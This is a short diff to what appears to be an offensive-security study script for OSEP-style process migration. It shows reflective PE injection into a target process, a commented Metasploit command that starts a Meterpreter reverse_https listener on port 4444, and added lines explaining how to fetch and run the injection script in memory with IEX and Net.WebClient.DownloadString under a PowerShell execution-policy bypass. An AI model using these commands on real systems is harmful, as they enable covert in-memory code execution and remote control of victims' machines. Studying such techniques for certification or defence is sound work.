@@ -9,3 +9,6 @@ Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
 
 #       msfconsole -qx "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST $(hostname -I | cut -d ' ' -f2);set LPORT 4444;run"
 
+#IMPORTANT, we can execute this script from memory in a PowerShell -ep bypass session and executing:
+#
+#       IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/qv1ntv5/OSEP/main/ProcessMigration/Powershell/ReflectiveInjectionInMemory.ps1')
